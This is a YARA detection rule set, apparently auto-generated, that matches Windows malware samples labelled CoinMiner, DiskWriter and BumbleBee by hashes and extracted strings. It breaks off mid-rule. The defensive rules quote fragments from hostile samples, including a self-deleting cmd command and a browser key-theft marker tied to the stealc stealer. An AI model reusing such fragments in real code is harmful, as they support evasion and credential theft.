/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule b30d4021abe7bc754f90105bfd91830d_imphash_ {
   meta:
      description = "_subset_batch - file b30d4021abe7bc754f90105bfd91830d(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee9295fa36e29808ff36beb55be328b68d82f267d2faa54db26e0bf86b78fa56"
   strings:
      $s1 = "emRdSOy.dll" fullword ascii /* score: '23.00'*/
      $s2 = "ytygrfkwsekhdsblxrqghmgspmqoistsrbidcnuspbdmqwlikuofohbnlrgnieturhlpxigshhbrmaeidimwpubqrpvenoavojsqmtmckwmfuaihqtlkngrvqrcssrxw" ascii /* score: '17.00'*/
      $s3 = "pwwywcjklisrhqmyaornscmywmytjonjbqmyivquivvlowkgsexluchbeyxpuiqbxqfljeelljgnlhsjwhwotiiheyejpdumoevhtxbw" fullword ascii /* score: '13.00'*/
      $s4 = "apiLoader" fullword ascii /* score: '13.00'*/
      $s5 = "yojftwgtkfrkbwodshjpkaegiglkcmtmkpthpuvnphweurpdwptysmmrgmppwtdruyohkefunbucgsmamvkwplpgvbnreanfsakkhoqiqxtosfuriwyblogdwtetgdmv" ascii /* score: '13.00'*/
      $s6 = "mhxaxnnhdewaqdghvquihqodhdxhsuqkeqexnayfwnfxtrqmckmscjlggjghjounnrurxrexmrunoifkuvicmwbqljmospxcjdpqiqhdsqalorptvrftkvrimxvmyupy" ascii /* score: '11.00'*/
      $s7 = "kdoqqemxyyvnbthpcrxekfqjyuigolimcimkvrfdfldabrxwfmytoqemnbsjccvivyhhckbqajnrjcsajycbylkmhhqnpunldynnampsocmdwyjqurxbigmkxflwwvgw" ascii /* score: '11.00'*/
      $s8 = "grjodrsvduvaeccpcgpvxaobfjkbvuivyedjshhvvvmqohvlfessfrsfwrtfahjerlncvxhnjkuummdmucdbkavovhiwpwevtxrxxwxibinhunkkdoyjvdfmhjoqvvlt" ascii /* score: '11.00'*/
      $s9 = "siepjijhdibktjfqffcxrvoscecqraolbactataytnomtkumklqxkmsjfjqyuhcmonnpvdjewcjuxqeaptyckrahfpqefbgvphqisgfuyoghdtbbicjppgatrqqbwuol" ascii /* score: '11.00'*/
      $s10 = "kdoqqemxyyvnbthpcrxekfqjyuigolimcimkvrfdfldabrxwfmytoqemnbsjccvivyhhckbqajnrjcsajycbylkmhhqnpunldynnampsocmdwyjqurxbigmkxflwwvgw" ascii /* score: '11.00'*/
      $s11 = "pvorsumrrmxviwjladdtuofpsvugytrflskcfttywiyjnhudtidyasycliaigtetjghrwgognwfmynykarxdtwbjrcmdhlcvvufmdgmvfyeiduechxhalwpcsaekfpic" ascii /* score: '11.00'*/
      $s12 = "\\cnmplog" fullword wide /* score: '10.00'*/
      $s13 = "ucwyoxgkfomuluctuxqnornudfiglulcxffdtftpfvtpwbhwdturfiqxrqxkcerjicyfbufvgaumiwbdlrpalqeotgiuplnktsimytxgawskkcgsugmcncaxecoidmie" ascii /* score: '9.00'*/
      $s14 = "ucwyoxgkfomuluctuxqnornudfiglulcxffdtftpfvtpwbhwdturfiqxrqxkcerjicyfbufvgaumiwbdlrpalqeotgiuplnktsimytxgawskkcgsugmcncaxecoidmie" ascii /* score: '9.00'*/
      $s15 = "clieqbdxlrhdystegpxwwiraspbtsynsvwdqxxcgntxnwdadledsydyhooywidcbnrxfmlblvqpbtaylejkhhlwspxoyrfnkbubudmvjtwrpgtivthdsfhegkxbpulvk" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule b6182fbe920df1aaf4d2d78709ace252_imphash_ {
   meta:
      description = "_subset_batch - file b6182fbe920df1aaf4d2d78709ace252(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "680dc01df2f5b2033de43a73b161c59fe1a64f6cc8af37510dd5af6d839efd8f"
   strings:
      $s1 = "'GIF resized on https://ezgif.com/resize" fullword ascii /* score: '17.00'*/
      $s2 = "\"40&\"-3{1" fullword ascii /* score: '9.00'*/ /* hex encoded string '@1' */
      $s3 = "=%=.=7=b=" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s4 = "!!!\"\"\"$$$***///000111222444666===>>>@@@AAABBBEEEHHHIIIKKKMMMQQQRRRTTTUUUWWWZZZ[[[\\\\\\]]]___aaabbbccceeehhhiiijjjkkklllmmmpp" ascii /* score: '9.00'*/
      $s5 = "!!!\"\"\"$$$***///000111222444666===>>>@@@AAABBBEEEHHHIIIKKKMMMQQQRRRTTTUUUWWWZZZ[[[\\\\\\]]]___aaabbbccceeehhhiiijjjkkklllmmmpp" ascii /* score: '9.00'*/
      $s6 = "GetDpiForWindow" fullword ascii /* score: '9.00'*/
      $s7 = "* {eN;" fullword ascii /* score: '9.00'*/
      $s8 = "mIsisL0B -\"$" fullword ascii /* score: '8.00'*/
      $s9 = "aaabbbdddfff" ascii /* score: '8.00'*/
      $s10 = "cccdddeeefff" ascii /* score: '8.00'*/
      $s11 = "aaabbbcccfff" ascii /* score: '8.00'*/
      $s12 = "bbbccceeefff" ascii /* score: '8.00'*/
      $s13 = "VTaB- U" fullword ascii /* score: '8.00'*/
      $s14 = "aaabbbccceeefff" ascii /* score: '8.00'*/
      $s15 = "aaaccceeefff" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      8 of them
}

rule db07f88dce500d5d17a8722697b3ff6d_imphash_ {
   meta:
      description = "_subset_batch - file db07f88dce500d5d17a8722697b3ff6d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6b97a6ae3851e90e39239363580afa054f57cd225f745b167857bf493a06b8e"
   strings:
      $x1 = "C:\\Users\\Public\\Libraries\\app-3.15.4\\config.dat" fullword ascii /* score: '37.00'*/
      $x2 = "\\arphaDump64.dll" fullword wide /* score: '31.00'*/
      $s3 = "arphaDump64-safew.dll" fullword ascii /* score: '30.00'*/
      $s4 = "PNPXP000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" ascii /* score: '30.00'*/
      $s5 = "C:\\Users\\Public\\Libraries\\" fullword wide /* score: '27.00'*/
      $s6 = "zdfsdasd.exe" fullword wide /* score: '22.00'*/
      $s7 = "C:\\ProgramData\\zdfsdasd\\app-3.15.4\\config.dat" fullword ascii /* score: '20.00'*/
      $s8 = "GetArphaCrashDump" fullword ascii /* score: '19.00'*/
      $s9 = "GetArphaJamDump" fullword ascii /* score: '19.00'*/
      $s10 = "4HN/82HaYKp0CqK00K275Or80009o8sDJ2WaN8bC0009k9sDJ30aJ8j8001FfkZWYqp8YqZICm002RY5YqG0022sw0002i0af8bCouj10000gOOF000AHFk1GG002RYT" ascii /* score: '16.00'*/
      $s11 = "HK5JLm0d001qOsLiPLDqRcLsHK5JLm0g001qRcLsHMLqOMLoGq5JLm0W07HkPNP5T6LpPL91KrS0I000StHkPNP5PMnmQNHiTKroRqPqQM5NGLDN05a006nqOsz9GLDN" ascii /* score: '16.00'*/
      $s12 = "I5SG97I9I0WaN8b8pCp3N45TGLv1uuj9C7kBIIXhYqaWMuj90000a2ISZKp0Cm00iD8L/m01SVWDY////qYC3m000GZxWKZ4/q5OmuD8/////Zi4nqX023jCW0th33j4" ascii /* score: '16.00'*/
      $s13 = "WqXN22HSYKZCpFRhm3F3Mo34WqW1GetoTTA5I0XIYqWIT1evI0dh0001892BIF//chxesOj88Eo3I5D0pCDR8CI3ICEBI0000I2OYKZ//vhTw0XBYKZ9CmBh000188YB" ascii /* score: '16.00'*/
      $s14 = "SsLZRt9GT6vbSd9rGtHbHm77001qRdLlGsjZQLHqPKS2cW1oPNHkTMz3PMDkOMroRsPoPL1vScLrKGEf001NSsTkQN9qKtHkPMrkRt9fTcv5T6L70U40LtDdRcboT5Dq" ascii /* score: '16.00'*/
      $s15 = "P8jC82HyYqp0C////rQC3s0aP3j4p/z1/Il4/q7s0qa3TFQ5I000092TYKbeHVz168b80000a8MBIGE9I00008Y5ZKa8Gub80000a8MBIHX3YST43q48Mub86ub80000" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule b9d156d3dd2264da404f660f93031662ce336655fe32880ace8ad154ba119942_b9d156d3 {
   meta:
      description = "_subset_batch - file b9d156d3dd2264da404f660f93031662ce336655fe32880ace8ad154ba119942_b9d156d3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9d156d3dd2264da404f660f93031662ce336655fe32880ace8ad154ba119942"
   strings:
      $x1 = "C:\\code\\various\\squirrel.windows\\build\\Release\\Win32\\StubExecutable.pdb" fullword ascii /* score: '34.00'*/
      $s2 = "AxisCameraStationEdge.exe" fullword wide /* score: '18.00'*/
      $s3 = ":(;/;4;8;<;@;" fullword ascii /* score: '9.00'*/ /* hex encoded string 'H' */
      $s4 = "version identifier cannot be empty" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature__c73849cc506d9b95376433d4aba597ec_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_c73849cc506d9b95376433d4aba597ec(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d80727d18aaedacd2783bc1d4a580aeda8f76de38151bf7acb7cffcd71d0908"
   strings:
      $x1 = "C:\\Windows\\system32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s2 = "twow64base.dll" fullword wide /* score: '23.00'*/
      $s3 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s4 = "brave.exe" fullword wide /* score: '22.00'*/
      $s5 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s6 = "/c timeout /t 5 & del /f /q \"" fullword ascii /* score: '15.00'*/
      $s7 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide /* score: '15.00'*/
      $s8 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s9 = "C:\\builder_v2\\stealc\\json.h" fullword wide /* score: '13.00'*/
      $s10 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s11 = "\"app_bound_encrypted_key\":\"" fullword ascii /* score: '12.00'*/
      $s12 = "n_chars < number_buffer.size() - 1" fullword wide /* score: '12.00'*/
      $s13 = "last - first >= std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s14 = "last - first >= kMaxExp + 2" fullword wide /* score: '12.00'*/
      $s15 = "last - first >= 2 + (-kMinExp - 1) + std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      1 of ($x*) and 4 of them
}

rule DiskWriter_signature__7d923bee8ecf7a890f7b2630b3b9f891_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_7d923bee8ecf7a890f7b2630b3b9f891(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f32ad99c3ef07f00e0e8dfc911f09368de70fc5b0169750c9a17518e97966fe1"
   strings:
      $x1 = "C:\\Users\\Christian\\Desktop\\Savedfiles\\Visual Studio 2022 Projects\\Holzinium\\Release\\Holzinium.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "xmscoree.dll" fullword wide /* score: '23.00'*/
      $s3 = "Execute this GDI Only? You will be able to use Windows again!" fullword ascii /* score: '18.00'*/
      $s4 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii /* score: '16.00'*/
      $s5 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide /* score: '16.00'*/
      $s6 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide /* score: '16.00'*/
      $s7 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide /* score: '16.00'*/
      $s8 = "Do you still wanna execute this GDI Only?" fullword ascii /* score: '14.00'*/
      $s9 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.34.31933\\include\\vector" fullword wide /* score: '13.00'*/
      $s10 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.34.31933\\include\\xmemory" fullword wide /* score: '13.00'*/
      $s11 = "vector subscript out of range" fullword ascii /* score: '12.00'*/
      $s12 = "minkernel\\crts\\ucrt\\src\\appcrt\\internal\\win_policies.cpp" fullword wide /* score: '12.00'*/
      $s13 = "minkernel\\crts\\ucrt\\src\\appcrt\\convert\\c32rtomb.cpp" fullword wide /* score: '12.00'*/
      $s14 = "c32 < (1u << (7 - trail_bytes))" fullword wide /* score: '12.00'*/
      $s15 = "minkernel\\crts\\ucrt\\src\\appcrt\\lowio\\close.cpp" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4d2eafa1d9870135677789f30f4bf9bd7e229f76f32b8f36d6346398c9f9f72c"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s7 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s8 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s9 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s10 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s11 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s12 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s13 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s14 = "$\\-49[{-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'I' */
      $s15 = "VgeTZ*/'" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule CoinMiner_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__d1083c64 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_d1083c64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d1083c64786f168d121f53330358f9dbb8eeb755d2e3ff08fa6380be0fba4ec8"
   strings:
      $s1 = "rendercore.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = ">PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = ":/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "RenderCore Engine - High-performance 3D rendering engine" fullword wide /* score: '12.00'*/
      $s6 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s7 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s8 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s9 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s10 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s11 = ":WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s12 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s13 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s14 = "FL&Z\\pT,^H- -" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule bc45035360668282e93a127da3d0b40a_imphash_ {
   meta:
      description = "_subset_batch - file bc45035360668282e93a127da3d0b40a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0053ae400a511aedeabf64105aed094f8cc8f802bb45e8ad6b270306ff00d826"
   strings:
      $s1 = "REDprelauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "55555555555555556666666666666666" ascii /* score: '19.00'*/ /* hex encoded string 'UUUUUUUUffffffff' */
      $s3 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s4 = "Default.rar" fullword wide /* score: '10.00'*/
      $s5 = "object key" fullword ascii /* score: '9.00'*/
      $s6 = "syntax error " fullword ascii /* score: '9.00'*/
      $s7 = "-+53)%&.(" fullword ascii /* score: '9.00'*/ /* hex encoded string 'S' */
      $s8 = "eaQKtyNeyeulurV" fullword ascii /* score: '9.00'*/
      $s9 = "000000000000000055555555555555556666666666666666\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUUUUUUUffffffff' */
      $s10 = "ebwadgyqqu" fullword ascii /* score: '8.00'*/
      $s11 = "[pigsyscall::Syscall::GetSyscallNumber] Function \"%s\" not found!" fullword ascii /* score: '8.00'*/
      $s12 = "idR_PIONDbr!\"*** " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule de282b5f8be670801ef7c6a03a57a3bf_imphash_ {
   meta:
      description = "_subset_batch - file de282b5f8be670801ef7c6a03a57a3bf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c51bc3a44b63bd7104998d7d473edcd4acca8165b4b6a16ebbc5101146ca989"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s3 = "              Comodo will disclose information where required by a subpoena, interception order or other lawful process.  Comodo" ascii /* score: '20.00'*/
      $s4 = "ithub.com/Cyan4973/lz4\">https://github.com/Cyan4973/lz4</a></span></u></p>" fullword ascii /* score: '20.00'*/
      $s5 = "ithub.com/open-source-parsers/jsoncpp\">https://github.com/open-source-parsers/jsoncpp</a></span></u></p>" fullword ascii /* score: '20.00'*/
      $s6 = "              Comodo will disclose information where required by a subpoena, interception order or other lawful process.  Comodo" ascii /* score: '20.00'*/
      $s7 = ".\\dragon_util.dll" fullword wide /* score: '20.00'*/
      $s8 = "d:\\agent\\_work\\3\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\src\\mfc\\oledrop2.cpp" fullword wide /* score: '20.00'*/
      $s9 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s10 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s11 = "              the Products if you fail to complete a required registration process.  You may also be required to select a userna" ascii /* score: '19.00'*/
      $s12 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s13 = "              the Products if you fail to complete a required registration process.  You may also be required to select a userna" ascii /* score: '19.00'*/
      $s14 = "?Auto-confirm browser changes required by Comodo Cloud AntiVirus!Improve your browsing experience.Xhttps://help.comodo.com/topic" wide /* score: '19.00'*/
      $s15 = "dragon_helper.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      8 of them
}

rule CoinMiner_signature__f8861a55b03332de97005193e8e4ddf0_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_f8861a55b03332de97005193e8e4ddf0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f85b6d87dcc12f7904f95f3716b18930c63cb18bd624c1abcbdd9181ba4efc2"
   strings:
      $s1 = "d:\\hotproject\\winring0\\source\\dll\\sys\\lib\\amd64\\WinRing0.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "[-] Failed processing reloc field at: " fullword ascii /* score: '22.00'*/
      $s3 = "execute once failure in __cxa_get_globals_fast()" fullword ascii /* score: '22.00'*/
      $s4 = "WinRing0.sys" fullword wide /* score: '22.00'*/
      $s5 = "[ERROR] Could not terminate the process. PID = " fullword ascii /* score: '20.00'*/
      $s6 = "Parser.ForwardTemplateRefs.empty()" fullword ascii /* score: '19.00'*/
      $s7 = "%s failed to acquire mutex" fullword ascii /* score: '18.00'*/
      $s8 = "%s failed to release mutex" fullword ascii /* score: '18.00'*/
      $s9 = "Personality continued unwind at the target frame!" fullword ascii /* score: '17.00'*/
      $s10 = "g\\*.dll" fullword wide /* score: '17.00'*/
      $s11 = "N12_GLOBAL__N_116itanium_demangle24ForwardTemplateReferenceE" fullword ascii /* score: '16.00'*/
      $s12 = "[ERROR] Loader/Payload bitness mismatch." fullword ascii /* score: '16.00'*/
      $s13 = "libunwind: %s - %s" fullword ascii /* score: '15.00'*/
      $s14 = "libunwind: __unw_get_reg(cursor=%p, regNum=%d, &value=%p)" fullword ascii /* score: '14.50'*/
      $s15 = "length_error was thrown in -fno-exceptions mode with message \"%s\"" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule d5d2e9dcfc23b884493c45fdeea3cc74_imphash_ {
   meta:
      description = "_subset_batch - file d5d2e9dcfc23b884493c45fdeea3cc74(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2ff2f4828152dcd6770d42eb1acb601d4301ce120d1138893a04cbb23e7e91a4"
   strings:
      $x1 = "C:\\Users\\user\\Desktop\\Qash\\core\\x64\\Release\\lynette.pdb" fullword ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*)
}

rule DiskWriter_signature__1d75db46cfd1dcd46ee8a84af5c60b5e_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_1d75db46cfd1dcd46ee8a84af5c60b5e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "256505c6a66798a6288d1b124ce651bbe499b4d8ff46f5e519fa593c0e376f3d"
   strings:
      $s1 = ".data$_ZN12_GLOBAL__N_110fake_mutexE" fullword ascii /* score: '24.00'*/
      $s2 = ".data$_ZZN12_GLOBAL__N_116get_static_mutexEvE4once" fullword ascii /* score: '24.00'*/
      $s3 = ".data$_ZGVZN12_GLOBAL__N_122get_locale_cache_mutexEvE18locale_cache_mutex" fullword ascii /* score: '20.00'*/
      $s4 = ".data$_ZZN12_GLOBAL__N_122get_locale_cache_mutexEvE18locale_cache_mutex" fullword ascii /* score: '20.00'*/
      $s5 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s6 = ".data$_ZGVZN12_GLOBAL__N_116get_locale_mutexEvE12locale_mutex" fullword ascii /* score: '20.00'*/
      $s7 = ".data$_ZZN12_GLOBAL__N_116get_locale_mutexEvE12locale_mutex" fullword ascii /* score: '20.00'*/
      $s8 = "__ZN12_GLOBAL__N_110fake_mutexE" fullword ascii /* score: '20.00'*/
      $s9 = "__ZZN12_GLOBAL__N_116get_static_mutexEvE4once" fullword ascii /* score: '20.00'*/
      $s10 = ".data$_ZN12_GLOBAL__N_1L12static_mutexE" fullword ascii /* score: '19.00'*/
      $s11 = "_ShellExecuteExA@4" fullword ascii /* score: '18.00'*/
      $s12 = "__gthread_recursive_mutex_t" fullword ascii /* score: '18.00'*/
      $s13 = "__ZNSt12__basic_fileIcEC2EP17__gthread_mutex_t" fullword ascii /* score: '18.00'*/
      $s14 = "?__gthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s15 = "?__gthread_mutex_lock" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      8 of them
}

rule BumbleBee_signature__9111c5749cbacb2cb6ac54b1c6d61341_imphash_ {
   meta:
      description = "_subset_batch - file BumbleBee(signature)_9111c5749cbacb2cb6ac54b1c6d61341(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6ba5d96e52734cbb9246bcc3decf127f780d48fa11587a1a44880c1f04404d23"
   strings:
      $s1 = "C:\\Windows\\System32\\msimg32.DllInitialize" fullword ascii /* score: '27.00'*/
      $s2 = "msimg32_0x000E8E5D2BCF4A7.dll" fullword ascii /* score: '20.00'*/
      $s3 = "C:\\Windows\\System32\\msimg32.GradientFill" fullword ascii /* score: '18.00'*/
      $s4 = "C:\\Windows\\System32\\msimg32.TransparentBlt" fullword ascii /* score: '18.00'*/
      $s5 = "C:\\Windows\\System32\\msimg32.AlphaBlend" fullword ascii /* score: '18.00'*/
      $s6 = "C:\\Windows\\System32\\msimg32.vSetDdrawflag" fullword ascii /* score: '18.00'*/
      $s7 = "SPyB6G\"E" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule BumbleBee_signature__b7bcf3669526d9f7c267cb4aba912a86_imphash_ {
   meta:
      description = "_subset_batch - file BumbleBee(signature)_b7bcf3669526d9f7c267cb4aba912a86(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331"
   strings:
      $s1 = "C:\\Windows\\System32\\msimg32.DllInitialize" fullword ascii /* score: '27.00'*/
      $s2 = "msimg32_0x0006C85A0E4C916.dll" fullword ascii /* score: '20.00'*/
      $s3 = "C:\\Windows\\System32\\msimg32.GradientFill" fullword ascii /* score: '18.00'*/
      $s4 = "C:\\Windows\\System32\\msimg32.TransparentBlt" fullword ascii /* score: '18.00'*/
      $s5 = "C:\\Windows\\System32\\msimg32.AlphaBlend" fullword ascii /* score: '18.00'*/
      $s6 = "C:\\Windows\\System32\\msimg32.vSetDdrawflag" fullword ascii /* score: '18.00'*/
      $s7 = "Demonologic Saoshyant circumambulating YdOURvpE8c" fullword wide /* score: '14.00'*/
      $s8 = "Pausers hc4u0l Vituperative SWIbJf" fullword wide /* score: '12.00'*/
      $s9 = "eYMQX Imperturbation lLGaftFho hashheads" fullword wide /* score: '12.00'*/
      $s10 = "Bestrowed Ddhbn inexecutable" fullword wide /* score: '12.00'*/
      $s11 = "microprocessor Citification markfieldite harsher" fullword wide /* score: '11.00'*/
      $s12 = "RM74XQeGD Tempt iJIaTlusY" fullword wide /* score: '11.00'*/
      $s13 = "polyadenia\\nontemptation\\o0\\QWOi\\R" fullword wide /* score: '11.00'*/
      $s14 = "Bronchostomies\\Winglet\\characterologically" fullword wide /* score: '10.00'*/
      $s15 = "Recalls Postinfective Chaouia 5Ruv8" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule eddc4b646ec8305566453e7ba002f98b_imphash_ {
   meta:
      description = "_subset_batch - file eddc4b646ec8305566453e7ba002f98b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1c7fe702e643436a6a021dfcd4fc7faccb33965af290e471a07c69e741a0700b"
   strings:
      $s1 = "C:\\Windows\\System32\\wmsgapi.WmsgPostNotifyMessage" fullword ascii /* score: '23.00'*/
      $s2 = "C:\\Windows\\System32\\wmsgapi.WmsgPostMessage" fullword ascii /* score: '23.00'*/
      $s3 = "C:\\Windows\\System32\\wmsgapi.WmsgSendPSPMessage" fullword ascii /* score: '18.00'*/
      $s4 = "C:\\Windows\\System32\\wmsgapi.WmsgSendMessage" fullword ascii /* score: '18.00'*/
      $s5 = "Processors bullrings" fullword wide /* score: '15.00'*/
      $s6 = "parietotemporal" fullword wide /* score: '15.00'*/
      $s7 = "C:\\Windows\\System32\\wmsgapi.WmsgBroadcastMessage" fullword ascii /* score: '14.00'*/
      $s8 = "C:\\Windows\\System32\\wmsgapi.WmsgBroadcastNotifyMessage" fullword ascii /* score: '14.00'*/
      $s9 = "postesophageal Judicious e4qp0c AC6sN9rma" fullword wide /* score: '14.00'*/
      $s10 = "lateran\\CdOor\\Dyslexia\\Circumscissile" fullword wide /* score: '13.00'*/
      $s11 = "tuftily subcircularly" fullword wide /* score: '11.00'*/
      $s12 = "Echafaudage\\Extempore\\encomiums\\jardiniere" fullword wide /* score: '11.00'*/
      $s13 = "postliminious\\dishelmed" fullword wide /* score: '9.00'*/
      $s14 = "Pauperize\\RZrg6\\Headlongwise\\PoYd\\C" fullword wide /* score: '9.00'*/
      $s15 = "kamichi irCSgc Germinator" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule efd455830ba918de67076b7c65d86586_imphash_ {
   meta:
      description = "_subset_batch - file efd455830ba918de67076b7c65d86586(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
